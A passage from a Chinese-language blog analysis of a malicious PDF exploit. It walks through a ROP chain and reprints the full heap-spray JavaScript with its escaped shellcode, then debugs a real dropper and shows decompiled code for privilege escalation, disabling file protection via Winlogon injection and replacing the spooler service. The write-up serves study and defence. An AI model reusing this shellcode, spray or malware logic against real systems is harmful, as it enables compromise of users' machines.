src="http://imgsrc.baidu.com/forum/pic/item/d50735fae6cd7b891d6813494a2442a7d8330ef7.jpg"></p><p>可以看到这块映射区RWE权限均有</p><p>然后我们之后的调试就会将文件内存地址存放在0x4A8A004的地址了，如下图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b506c8bc998c035e5dde6116e87.jpg"></p><p>之后调试我们会在retn的地址存放该0x48D0000,方便我们ROP链返回<br>之后我们以同样的手段执行memcpy函数</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343fa88aeebd613b07ecb8088b0.jpg"></p><p>可以看到其中目的地址是0x048D0000,而我们的0x0c0c0D54存放着我们的恶意代码</p><p>我们使用ctrl + F9来跳到执行函数结束，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/09fa513d269759eeefe94901f7fb43166c22dfbb.jpg"></p><p>可以看到文件对象的内存地址处已经拷贝过去了大量恶意代码，并且retn那儿我们是直接返回到0x048D00这里，也就是这个文件处执行，而因为我们这个文件有RWX权限，所以说咱们可以执行该文件恶意代码。</p><p>因此从ROP链到执行恶意代码，我们分为以下几个步骤：</p><ol><li>利用溢出来构造ROP链，ROP链通过布置不带ALSR的库中gadget来绕过此机制，通过两次栈迁移来到达0x0C0C0C0C,我们通过堆喷在这里构造好栈数据和恶意代码</li><li>调用CreateFileA函数，创建ios88591这个文件</li><li>调用CreateFileMappingA函数，构造该文件在内存中的映射</li><li>调用MapviewOfFile函数，返回该文件映射在内存中的地址，上面三部是为了构造一块可执行可读可写的内存区域</li><li>调用memcpy,来将恶意代码存放到该文件映射当中</li><li>跳转到恶意代码执行</li></ol><h2 id="6-堆喷-Heap-Spray"><a href="#6-堆喷-Heap-Spray" class="headerlink" title="6.堆喷(Heap Spray)"></a>6.堆喷(Heap Spray)</h2><p>我们利用pdf中内嵌的javascript来申请，首先申请个200MB的内存，而我们一般分配内存都是从低地址开始分配，因此大概率0x0c0c0c0c会被包含在其中，而我们这里一般会在前面的部分大量填充0x90，表示NOP指令，也就是雪橇，如果我们ROP到0x0c0c0c0c，就会通过该雪橇滑向我们布置的ROP链上</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0df431adcbef760958c9b0556bdda3cc7dd99e3d.jpg"></p><p>我们可以通过PdfStreamDumper来解析pdf文件，从中提取出我们的JavaScript代码，如下：</p><pre><code class="hljs">var shellcode = unescape(&quot;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000&quot; +&quot;\x25\x7530e8\x25\x750000\x25\x75ad00\x25\x757d9b\x25\x75acdf\x25\x75da08\x25\x751676\x25\x75fa65&quot; +&quot;%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49&quot; +&quot;%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922&quot; +&quot;%u7e7c%ue2d8%u5b73%u8955%u81e5%u48ec%u0002%u8900&quot; +&quot;%ufc5d%u306a%u6459%u018b%u408b%u8b0c%u1c70%u8bad&quot; +&quot;%u0858%u0c6a%u8b59%ufc7d%u5351%u74ff%ufc8f%u8de8&quot; +&quot;%u0002%u5900%u4489%ufc8f%ueee2%u016a%u8d5e%uf445&quot; +&quot;%u5650%u078b%ud0ff%u4589%u3df0%uffff%uffff%u0475&quot; +&quot;%u5646%ue8eb%u003d%u0020%u7700%u4604%ueb56%u6add&quot; +&quot;%u6a00%u6800%u1200%u0000%u8b56%u0447%ud0ff%u006a&quot; +&quot;%u458d%u50ec%u086a%u458d%u50b8%u8b56%u0847%ud0ff&quot; +&quot;%uc085%u0475%u5646%ub4eb%u7d81%u50b8%u5064%u7444&quot; +&quot;%u4604%ueb56%u81a7%ubc7d%ufeef%uaeea%u0474%u5646&quot; +&quot;%u9aeb%u75ff%u6af0%uff40%u0c57%u4589%u85d8%u75c0&quot; +&quot;%ue905%u0205%u0000%u006a%u006a%u006a%uff56%u0457&quot; +&quot;%u006a%u458d%u50ec%u75ff%ufff0%ud875%uff56%u0857&quot; +&quot;%uc085%u0575%ue2e9%u0001%u5600%u57ff%u8b10%ud85d&quot; +&quot;%u838b%u1210%u0000%u4589%u8be8%u1483%u0012%u8900&quot; +&quot;%ue445%u838b%u1218%u0000%u4589%u03e0%ue445%u4503&quot; +&quot;%u89e8%udc45%u8a48%u0394%u121c%u0000%uc230%u9488&quot; +&quot;%u1c03%u0012%u8500%u77c0%u8deb%ub885%ufffe%u50ff&quot; +&quot;%uf868%u0000%uff00%u1457%ubb8d%u121c%u0000%uc981&quot; +&quot;%uffff%uffff%uc031%uaef2%ud1f7%ucf29%ufe89%uca89&quot; +&quot;%ubd8d%ufeb8%uffff%uc981%uffff%uffff%uaef2%u894f&quot; +&quot;%uf3d1%u6aa4%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc&quot; +&quot;%u1857%uff3d%uffff%u75ff%ue905%u014d%u0000%u4589&quot; +&quot;%u89c8%uffc2%ue875%u838d%u121c%u0000%u4503%u50e0&quot; +&quot;%ub952%u0100%u0000%u548a%ufe48%u748a%uff48%u7488&quot; +&quot;%ufe48%u5488%uff48%ueee2%u57ff%uff1c%uc875%u57ff&quot; +&quot;%u8d10%ub885%ufffe%ue8ff%u0000%u0000%u0481%u1024&quot; +&quot;%u0000%u6a00%u5000%u77ff%uff24%u2067%u57ff%u8924&quot; +&quot;%ud045%uc689%uc789%uc981%uffff%uffff%uc031%uaef2&quot; +&quot;%ud1f7%u8949%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f&quot; +&quot;%u048a%u3c0e%u7522%u491f%u048a%u3c0e%u7422%u8807&quot; +&quot;%u0f44%u4901%uf2eb%ucf01%uc781%u0002%u0000%u7d89&quot; +&quot;%ue9c0%u0013%u0000%u048a%u3c0e%u7420%u8806%u0f04&quot; +&quot;%ueb49%u01f3%u47cf%u7d89%uffc0%uf075%u406a%u558b&quot; +&quot;%ufffc%u0c52%u4589%u89d4%u8bc7%ue875%u7503%u01e0&quot; +&quot;%u81de%u1cc6%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc&quot; +&quot;%uff00%uc075%u57ff%u8918%uc445%uff3d%uffff%u74ff&quot; +&quot;%u576a%uc389%u75ff%ufff0%ud475%uff50%u1c57%uff53&quot; +&quot;%u1057%u7d8b%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae&quot; +&quot;%u29d1%u89cf%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d&quot; +&quot;%uc72e%u0447%u7865%u2065%u47c7%u2f08%u2063%u8122&quot; +&quot;%u0cc7%u0000%uf300%u4fa4%u07c6%u4722%u07c6%u5f00&quot; +&quot;\x25\x75858d\x25\x75fdb8\x25\x75ffff\x25\x7500e8\x25\x750000\x25\x758100\x25\x752404\x25\x750010&quot; +&quot;%u0000%u006a%uff50%u2477%u67ff%u6a20%uff00%u2c57&quot; +&quot;%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178&quot; +&quot;%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b&quot; +&quot;%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701&quot; +&quot;%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b&quot; +&quot;%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0&quot; +&quot;%u5fea%u5d5e%uc25b%u0008&quot;);// unescape(&quot;%u0c0c%u0c0c&quot;); 滑块代码 0x0c 等于指令 OR al, 0C; 大量执行对 shellcode 无影响var nop_chip = unescape(&quot;\x25\x750c0c\x25\x750c0c&quot;);// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用while (nop_chip.length + 20 + 8 &lt; 65536)    nop_chip += nop_chip;// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处temp_chip = nop_chip.substring(0, (0x0c0c - 0x24) / 2);temp_chip += shellcode; //拼接上 shellcode，该位置一定在 0c0c 结尾的地址处temp_chip += nop_chip; //拼接后续的滑块代码 // shellcode 小片段一个是 0x10000 大小，unicode 一个长度等于2字节，0x10000实际是 0x20000 字节大小，除2 为 0x10000small_shellcode_slide = temp_chip.substring(0, 65536 / 2);// 最终一个shellcode实际大小为 1MB，0x80000 * 2 = 0x100000 = 1MBwhile (small_shellcode_slide.length &lt; 0x80000)    small_shellcode_slide += small_shellcode_slide;// 从后面截短 0x1020 - 0x08 = 4120 字节，目的应该是让实际大小小于1MB，因为这里分配的一个堆块是1MB大小，shellcode_slide 应该小于堆块大小shellcode_slide = small_shellcode_slide.substring(0, 0x80000 - (0x1020 - 0x08) / 2);var slide = new Array();// 0x1f0 等于 496 ，也就是在内存中申请了接近 500 MB 的内存for (i = 0; i &lt; 0x1f0; i++)     slide[i] = shellcode_slide + &quot;s&quot;;// s 字符无实际作用，估计用于免杀</code></pre><p>可以看到上面代码首先是构造一个链条</p><pre><code class="hljs">var nop_chip = unescape(&quot;\x25\x750c0c\x25\x750c0c&quot;);// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用while (nop_chip.length + 20 + 8 &lt; 65536)    nop_chip += nop_chip;</code></pre><p>上述代码可以近似看作拼接大量<code>nop</code>指令，然后我们精准堆喷，这里我们截取一下我们的构造链条，使得我们的shellcode能被存放在0x****0c0c,这里减去0x24，是因为堆头部会占据0x20字节，然后shellcode首部我们添加了4个‘A’</p><pre><code class="hljs">// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处temp_chip = nop_chip.substring(0, (0x0c0c - 0x24) / 2);temp_chip += shellcode; //拼接上 shellcode，该位置一定在 0c0c 结尾的地址处</code></pre><p>然后我们将shellcode小片填充1MB大小，然后往我们准备的数组中不断填充数据，直到我们填满500的话就差不多用了500MB了</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/472309f790529822ae6a110992ca7bcb0b46d49b.jpg"></p><p>可以看到我们目前啥东西没开但是已经用了700M是哪儿来的了</p><h2 id="7-恶意样本分析"><a href="#7-恶意样本分析" class="headerlink" title="7.恶意样本分析"></a>7.恶意样本分析</h2><p>我们已经完成了样本分析过程，接下来我们来看看恶意代码的调试分析，首先是我们的调试界面，这里之前我们使用的分析样本是简单的执行一个计算器的打印，但是这里我们直接拿真正的恶意样本来进行分析，他名字是一个名企面试自助手册</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0b55b319ebc4b745d9899cdc8afc1e178b8215de.jpg"></p><p>此时我们像之前漏洞分析一样直接运行到恶意代码处，这里是call了一个值，我们步入查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/48540923dd54564ed271cff3f6de9c82d0584fe7.jpg"></p><p>恶意代码会从 kernel32.dll 中获取想要调用的函数地址。首先获取了 kernel32.dll 的基地址，0x4930044 处先赋值 ecx 为 0x30 ，fs[0x30] 处即为进程环境块 PEB 的指针，通过 PEB + 0xC 偏移处获取<br>PEB_LDR_DATA 结构体指针，PEB_LDR_DATA 偏移 0x1C 处获取<br><code>InInitializationOrderModuleList</code>成员指针，lods [esi] 获取双向链表当前节点的后继指针, 指向 kernel32.dll 节点，找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址。获取加载基地址为 0x7C800000 ，保存在 ebx 中，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4034970a304e251fc182cf32e286c9177e3e5386.jpg"></p><p>而上图中即将压入栈的0xC是我们即将寻找的函数数量，而我们上图中会运行到一个call函数，步入如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fca5afdd07b9039245d788219f.jpg"></p><p>栈上第一个参数是第一个函数的hash，第二个为kernel32.dll的基地址，然后我们0x49302f8地址指令会将该基地址偏移0x3c的值赋给eax，这个0x3c是PE头部偏移量的存储位置，然后在PE头部偏移0x78处，也就是我们kernel32.dll导出表的虚拟地址0x262c赋值给edx，如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/1c950a7b02087bf4ca527c23b7d3572c10dfcfba.jpg"></p><p>此时我们的edx是存放着kernel32.dll导出表的虚拟地址的，此时我们再将偏移0x18和0x20的值分别存放在ecx和ebx中，这里的偏移分别保存着导出表函数的数目和导出表函数名称表的地址偏移</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c3361d7f5025f4c510fd8f9a14a.jpg"></p><p>然后我们继续单步，发现在0x493030F,这里，我们是将函数表中最后一个函数名称地址放入esi</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7a899e510fb30f24c604c7c98d95d143ac4b0359.jpg"></p><p>可以看到我们上面放入esi的函数名是<code>IstrenW</code>,然后我们在0x493031B处根据函数名计算hash，然后同之前我们压栈的hash([esp + 0x14])进行比较，若相同则继续往下走</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/fcfaaf51f3deb48fa3fb8a14b51f3a292cf5786d.jpg"></p><p>然后我们在cmp那里下一个条件断点，免得我们一直循环，我们选择conditional这条，然后条件写<code>esp == [esp+ 0x14]</code>,然后F9</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d6ca7bcb0a46f21f5fc47599b3246b600d33ae0c.jpg"></p><p>可以看到专门存放函数名的esi，此时是<code>ExitThread</code>，说明我们要寻找的函数就是他</p><ol><li>先在导出表偏移 0x24 处获取输出序号数组的地址</li><li>通过输出序号数组获取 ExitThread 函数的序号，其中 ECX 就是序号</li><li>获取函数地址数组</li><li>根据序号在函数地址数组中找到 ExitThread 函数的地址，保存在 eax 中，可以看到下图此时 eax 已经指ExitProcess 函数，猜测在实际中，ExitThread 函数即为 ExitProcess 函数</li></ol><p><img src="http://imgsrc.baidu.com/forum/pic/item/d62a6059252dd42ac7d72a61463b5bb5c8eab81a.jpg"></p><p>然后我们执行到这里会将其存放在[edi+ecx*4-0x4],</p><pre><code class="hljs">04930063    59              pop ecx04930064    89448F FC       mov dword ptr ds:[edi+ecx*4-0x4],eax   ; kernel32.ExitProcess04930068  ^ E2 EE           loopd short 04930058</code></pre><p>接下来接着循环，此时的ecx存放着我们想要解析的函数数目，这里可以看到我们是将eax指向的函数指针保存在内存中某个位置，我们同样在此处下一个条件断点，条件为<code>ecx == 1</code>,然后F9，此时执行完毕会发现对应内存填充了我们的函数地址</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d8f9d72a6059252d393237ce719b033b5ab5b9d7.jpg"></p><p>然后我们调用GetFileSize函数，若发现其大于，此处会一直遍历所有 handler 并获取文件大小，比较是否大于 0x2000，如果大于则跳转到 0x493008F。我们在此处下个断点，然后运行查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6159252dd42a2834dbd41cc11eb5c9ea14cebf8e.jpg"></p><p>大伙这里出了个问题，就是之前用计算器简单脚本所执行的iso88591没清理干净，导致运行始终不如意，这里我恢复虚拟机快照后重新编译了一遍，此时其他的基本没变，只是我们恶意代码的基地址变了一下，抱歉。</p><p>然后这里底下才是正确的返回值</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d10172926fb643fb80e7aec907e.jpg"></p><p>可以看到我们目前esi指向的句柄为0x310，指向的eax为文件大小，为0x1CAD74，然后我们可以点击上面的H来查看一下内存中存在的句柄，可以发现恰好就是咱们的恶意文件pdf</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/21a4462309f7905241e96df449f3d7ca7acbd502.jpg"></p><p>接下来我们会调用函数<code>SetFRilePointer</code>，将函数指针偏移到文件0x1200的位置，这里就不逐步查看了，我们直接往下走，之后我们会调用<code>ReadFile</code>函数，读取该位置8字节到栈上0x0c0c0cFc</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fa129df81fafa40f4afb0518.jpg"></p><p>之后我们会检查一下几点固定值，若相等，则确定为恶意文件本身，然后我们调用<code>GlobalAlloc</code>函数，从堆中分配一定的字节，然后填充0，大小为我们之前获得的那个值，然后我们分配好空间后，再次调用<code>readFile</code>将恶意pdf读入内存中</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb1372a616d99854564e93584b28.jpg"></p><p>读出来后，使用异或解密 PDF 中的一个 stream 流对象</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/faedab64034f78f066308f393c310a55b2191cc4.jpg"></p><p>解密后可以看到标红这里有一个svrhost.exe字符串，他被拼接到右边栈0x0c0c0B40的临时目录地址上，然后我们调用<code>lcreate</code>函数来创建该临时文件，如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffc853caa78fc014a90f703eae2.jpg"></p><p>我们直接步过，然后到相应文件夹下查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b5050faf598c035e5dde6116ef6.jpg"></p><p>可以看到确实有这个文件了，然后我们交换前0x200个字节，使前 200 字节恢复成正常的 PE 文件格式，然后调用 lwrite 函数把解密后的 PE 文件写进 svrhost.exe 中</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2934349b033b5bb538ba353473d3d539b700bc8f.jpg"></p><p>再然后我们调用<code>WinExec</code>函数进行执行该可执行文件，我们将他复制一份到IDA中打开</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f7246b600c33874409eb39b6140fd9f9d62aa0ca.jpg"></p><p>IDA反编译得到下面main函数</p><pre><code class="hljs">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char *v3; // edi  char *v5; // edi  char *v7; // edi  HANDLE FileA; // eax  int v10; // eax  HANDLE v12; // eax  int v13; // eax  void (__stdcall *v14)(LPCSTR, LPCSTR, DWORD); // edi  CHAR CmdLine[1021]; // [esp+18h] [ebp-728h] BYREF  __int16 v16; // [esp+415h] [ebp-32Bh]  char v17; // [esp+417h] [ebp-329h]  CHAR Filename[257]; // [esp+418h] [ebp-328h] BYREF  __int16 v19; // [esp+519h] [ebp-227h]  char v20; // [esp+51Bh] [ebp-225h] BYREF  CHAR v21[257]; // [esp+51Ch] [ebp-224h] BYREF  __int16 v22; // [esp+61Dh] [ebp-123h]  char v23; // [esp+61Fh] [ebp-121h] BYREF  CHAR Buffer[257]; // [esp+620h] [ebp-120h] BYREF  __int16 v25; // [esp+721h] [ebp-1Fh]  char v26; // [esp+723h] [ebp-1Dh]  CPPEH_RECORD ms_exc; // [esp+728h] [ebp-18h]  memset(Buffer, 0, sizeof(Buffer));  v25 = 0;  v26 = 0;  GetSystemDirectoryA(Buffer, 0x104u);  v3 = &amp;v23;  while ( *++v3 )    ;  strcpy(v3, &quot;\\setup\\&quot;);  v5 = &amp;v23;  while ( *++v5 )    ;  strcpy(v5, &quot;hid128.log&quot;);  memset(v21, 0, sizeof(v21));  v22 = 0;  v23 = 0;  GetSystemDirectoryA(v21, 0x104u);  v7 = &amp;v20;  while ( *++v7 )    ;  strcpy(v7, &quot;\\cmd.exe&quot;);  memset(CmdLine, 0, sizeof(CmdLine));  v16 = 0;  v17 = 0;  sprintf(CmdLine, &quot;%s /c echo 12345&gt;%s&quot;, v21, Buffer);// 格式化输出                                                // C:\WINDOWS\system32\cmd.exe /c echo 12345&gt;C:\WINDOWS\system32\setup\hid128.log  WinExec(CmdLine, 0);  Sleep(0xBB8u);  FileA = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0x10000080u, 0);  if ( FileA == (HANDLE)-1 )  &#123;    v10 = 0;  &#125;  else  &#123;    CloseHandle(FileA);    v10 = 1;  &#125;  if ( v10 )    sub_402180();                               // 关闭文件保护函数  memset(Filename, 0, sizeof(Filename));  v19 = 0;  v20 = 0;  GetModuleFileNameA(0, Filename, 0x104u);  if ( !sub_402210(Filename) )  &#123;    sub_40321D(&quot;Not configed, exit...\r\n&quot;);    return -1;  &#125;  v12 = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0x10000080u, 0);  if ( v12 == (HANDLE)-1 )  &#123;    v13 = 0;  &#125;  else  &#123;    CloseHandle(v12);    v13 = 1;  &#125;  if ( !v13 )    return -1;  GetSystemDirectoryA(::Buffer, 0x104u);  *(_WORD *)&amp;::Buffer[strlen(::Buffer)] = 92;  strcat(::Buffer, &quot;spoolss.dll&quot;);  GetSystemDirectoryA(byte_4127E8, 0x104u);  *(_WORD *)&amp;byte_4127E8[strlen(byte_4127E8)] = 92;  GetSystemDirectoryA(byte_4128F0, 0x104u);  strcat(byte_4128F0, &quot;\\Setup\\&quot;);  GetSystemDirectoryA(byte_4129F8, 0x104u);  strcat(byte_4129F8, &quot;\\catroot\\&quot;);  strcat(ExistingFileName, byte_4127E8);  strcat(ExistingFileName, aSpoolsvExe);  strcat(byte_412C08, byte_4127E8);  strcat(byte_412C08, aSpoolerExe);  strcat(byte_412D10, byte_4128F0);  strcat(byte_412D10, aSetjupryExe);  strcat(NewFileName, byte_4128F0);  strcat(NewFileName, aFxjssocmExe);  strcat(byte_412F20, byte_4127E8);  strcat(byte_412F20, aMsxml0rDll);  strcat(FileName, byte_4127E8);  strcat(FileName, aMsxml0Dll);  strcat(byte_413130, byte_4128F0);  strcat(byte_413130, aMsxm32Dll);  ms_exc.registration.TryLevel = 0;  sub_401FA0(ServiceName);  dword_413234 = sub_401A00(byte_413130);  if ( dword_413234 )  &#123;    v14 = (void (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;    MoveFileExA(ExistingFileName, byte_412C08, 3u);    CopyFileA(NewFileName, ExistingFileName, 0);    if ( sub_401000(ExistingFileName, (int)aMsxml0rDll, (int)aEntrypoint) == 1 )      sub_40321D(&quot;Install Again Successfully!\r\n&quot;);    else      sub_40321D(&quot;Install Again Failed!\r\n&quot;);    sub_401CE0(ExistingFileName, ::Buffer);  &#125;  else  &#123;    CopyFileA(ExistingFileName, NewFileName, 0);    v14 = (void (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;    MoveFileExA(ExistingFileName, byte_412C08, 3u);    CopyFileA(NewFileName, ExistingFileName, 0);    if ( sub_401000(ExistingFileName, (int)aMsxml0rDll, (int)aEntrypoint) == 1 )      sub_40321D(&quot;New Install Successfully!\r\n&quot;);    else      sub_40321D(&quot;New Install Failed!\r\n&quot;);    CopyFileA(ExistingFileName, byte_412D10, 0);    CopyFileA(::Buffer, byte_413130, 0);    sub_401D70(byte_4128F0, byte_4129F8);    sub_401CE0(ExistingFileName, ::Buffer);  &#125;  sub_401AD0(ServiceName);  if ( sub_401A00(byte_412F20) )  &#123;    if ( sub_401A00(FileName) )      DeleteFileA(FileName);    v14(byte_412F20, FileName, 3u);    sub_402110(byte_412F20, &amp;unk_40B148, 0x6E00u);    sub_4023F0(byte_412F20);    if ( sub_401CE0(byte_412F20, ::Buffer) )      sub_40321D(&quot;Upgrade Success!\r\n&quot;);    else      sub_40321D(&quot;Upgrade Failed!\r\n&quot;);  &#125;  else  &#123;    sub_402110(byte_412F20, &amp;unk_40B148, 0x6E00u);    sub_4023F0(byte_412F20);    sub_401CE0(byte_412F20, ::Buffer);    sub_401CE0(ExistingFileName, ::Buffer);  &#125;  ms_exc.registration.TryLevel = -1;  sub_401E20(ServiceName);  sub_401B70(4205738);  return 1;&#125;</code></pre><p>可以看到该函数首先是创建了一个log文件，然后输出12345到其中，之后我们进入注释的关闭文件保护函数，点击查看</p><pre><code class="hljs">int __thiscall sub_402180(void *this)&#123;  HMODULE v1; // esi  unsigned __int16 Version; // ax  __int16 v3; // ax  HMODULE LibraryA; // eax  DWORD (__stdcall *ProcAddress)(LPVOID); // esi  void *v6; // eax  HANDLE v7; // eax  DWORD ThreadId; // [esp+0h] [ebp-4h] BYREF  ThreadId = (DWORD)this;  sub_4016F0();                                 // 提权函数，启用SeDebugPreviledge  sub_401780(&quot;Winlogon.exe&quot;);  v1 = 0;  Version = GetVersion();  if ( (_BYTE)Version == 5 )  &#123;    v3 = HIBYTE(Version);    if ( !(_BYTE)v3 )    &#123;      LibraryA = LoadLibraryA(&quot;sfc.dll&quot;);LABEL_7:      v1 = LibraryA;      goto LABEL_8;    &#125;    if ( (_BYTE)v3 == 1 || (_BYTE)v3 == 2 )    &#123;      LibraryA = LoadLibraryA(&quot;sfc_os.dll&quot;);      goto LABEL_7;    &#125;  &#125;LABEL_8:  ProcAddress = (DWORD (__stdcall *)(LPVOID))GetProcAddress(v1, (LPCSTR)2);  ThreadId = 0;  v6 = (void *)sub_4018B0(&quot;Winlogon.exe&quot;);  v7 = CreateRemoteThread(v6, 0, 0, ProcAddress, 0, 0, &amp;ThreadId);  WaitForSingleObject(v7, 0xFA0u);  return 0;&#125;</code></pre><p>其中函数<code>sub_4016F0()</code>是一个典型的提权函数，他的名字应该是<code>ElvatePriviledge</code>,他的作用是获取 SeDebugPrivilege 权限并设置 SE_PRIVILEGE_ENABLED 属性来开启权限，这里没符号表很难受,跟进查看如下</p><pre><code class="hljs">int sub_4016F0()&#123;  HANDLE CurrentProcess; // eax  HANDLE TokenHandle; // [esp+0h] [ebp-1Ch] BYREF  struct _LUID Luid; // [esp+4h] [ebp-18h] BYREF  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-10h] BYREF  CurrentProcess = GetCurrentProcess();  if ( !OpenProcessToken(CurrentProcess, 0x28u, &amp;TokenHandle) )    return 0;  if ( !LookupPrivilegeValueA(0, &quot;SeDebugPrivilege&quot;, &amp;Luid) )  &#123;    CloseHandle(TokenHandle);    return 0;  &#125;  NewState.Privileges[0].Luid = Luid;  NewState.PrivilegeCount = 1;  NewState.Privileges[0].Attributes = 2;  AdjustTokenPrivileges(TokenHandle, 0, &amp;NewState, 0x10u, 0, 0);  CloseHandle(TokenHandle);  return 1;&#125;</code></pre><p>然后回到主函数，该函数会串讲停止打印服务脚本并且运行,这里会有一个字符串<code>Spooler</code></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/86d6277f9e2f070884b338caac24b899a801f242.jpg"></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d4628535e5dde7118d62513ce2efce1b9c166143.jpg"></p><p>，我们用OD进行动态调试</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2904b4c804dc25bc315d607cff.jpg"></p><p>我们跟进查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9815f29137c01213fb90e918d.jpg"></p><p>可以看到他会创建一个Temp_unstop.bat,然后我们写入内容</p><pre><code class="hljs">net stop &quot;Spooler&quot;net stop &quot;Spooler&quot;del &quot;C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\_unstop.bat&quot;</code></pre><p>他是为了关闭Spooler服务，然后删除自己。</p><pre><code class="hljs">void __cdecl sub_401FA0(const char *a1)&#123;  char *v1; // edi  HANDLE FileA; // esi  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-61Ch] BYREF  CHAR Buffer[257]; // [esp+18h] [ebp-618h] BYREF  __int16 v6; // [esp+119h] [ebp-517h]  char v7; // [esp+11Bh] [ebp-515h]  CHAR Filename[257]; // [esp+120h] [ebp-510h] BYREF  __int16 v9; // [esp+221h] [ebp-40Fh]  char v10; // [esp+223h] [ebp-40Dh]  CHAR v11[1021]; // [esp+228h] [ebp-408h] BYREF  __int16 v12; // [esp+625h] [ebp-Bh]  char v13; // [esp+627h] [ebp-9h]  memset(Buffer, 0, sizeof(Buffer));  v6 = 0;  v7 = 0;  GetTempPathA(0x104u, Buffer);  v1 = (char *)&amp;NumberOfBytesWritten + 3;  while ( *++v1 )    ;  strcpy(v1, &quot;_unstop.bat&quot;);  memset(Filename, 0, sizeof(Filename));  v9 = 0;  v10 = 0;  GetModuleFileNameA(0, Filename, 0x104u);  FileA = CreateFileA(Buffer, 0xC0000000, 1u, 0, 2u, 0x10000080u, 0);  if ( FileA != (HANDLE)-1 )  &#123;    memset(v11, 0, sizeof(v11));    v12 = 0;    v13 = 0;    wsprintfA(v11, &quot;net stop \&quot;%s\&quot;\r\nnet stop \&quot;%s\&quot;\r\ndel \&quot;%s\&quot; \r\n&quot;, a1, a1, Buffer);    NumberOfBytesWritten = 0;    WriteFile(FileA, v11, strlen(v11), &amp;NumberOfBytesWritten, 0);    CloseHandle(FileA);    ShellExecuteA(0, &quot;open&quot;, Buffer, 0, 0, 0);    Sleep(0x1388u);  